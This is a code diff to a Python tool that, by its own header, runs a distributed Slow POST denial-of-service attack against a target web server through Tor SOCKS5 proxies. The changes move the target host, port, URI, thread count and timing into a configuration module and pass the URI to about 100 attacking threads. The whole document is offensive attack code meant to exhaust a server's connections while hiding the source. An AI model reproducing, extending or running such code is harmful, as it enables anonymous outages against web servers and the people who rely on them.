@@ -2,6 +2,7 @@
     Author: Andres Andreu
     Company: neuroFuzz, LLC
     Date: 10/10/2012
+    Last Modified: 10/11/2012
     Prog to perform a distributed Slow POST DoS attack
     against a given target web server across multiple
     randomly chosen SOCKS5 sockets leveraging tor
@@ -38,6 +39,7 @@
 """
 from random import choice
 from threading import Thread
+from vars import slow_ddos_tor_vars
 from time import sleep
 import funcs
 import getopt
@@ -51,15 +53,16 @@ import string
 import sys
 
 class httpPost(Thread):
-    def __init__(self, host, port, sleepTime) :
+    def __init__(self, host, port, uri, sleepTime) :
         self.host = host
         self.port = port
         self.sleepTime = sleepTime
-        self.uri = "/"
-        self.torip = "127.0.0.1"
+        self.uri = uri
+        self.torip = slow_ddos_tor_vars.getTorIp()
+        sr = slow_ddos_tor_vars.getSleepBounds()
+        self.sleepRange = [sr[0], sr[1]]
+        self.choicePool = slow_ddos_tor_vars.getChoicePool()
         self.stopped = False
-        self.sleepRange = [5, 30]
-        self.choicePool = ''.join(map(chr, range(48, 58)) + map(chr, range(65, 91)) + map(chr, range(97, 123)))
         self.torportlist = []
         Thread.__init__(self)
 
@@ -119,14 +122,21 @@ class httpPost(Thread):
                     pass    
 
 
-def kickOff(host="", port="", plist=[]) :
-    threads = 100
-    sleepTime = 1000
+def kickOff(host="", port=-1, uri="", plist=[]) :
+    threads = slow_ddos_tor_vars.getThreads()
+    sleepTime = slow_ddos_tor_vars.getSleepTime()
+    
+    if len(host) == 0:
+        host = slow_ddos_tor_vars.getHost()
+    if port == -1:
+        port = slow_ddos_tor_vars.getPort()
+    if len(uri) == 0:
+        uri = slow_ddos_tor_vars.getUri()
 
     tpool = []
     try:
         for i in range(1, threads):
-            t = httpPost(host, port, sleepTime)
+            t = httpPost(host, port, uri, sleepTime)
             t.setTorPortList(plist=plist)
             tpool.append(t)
             t.start()
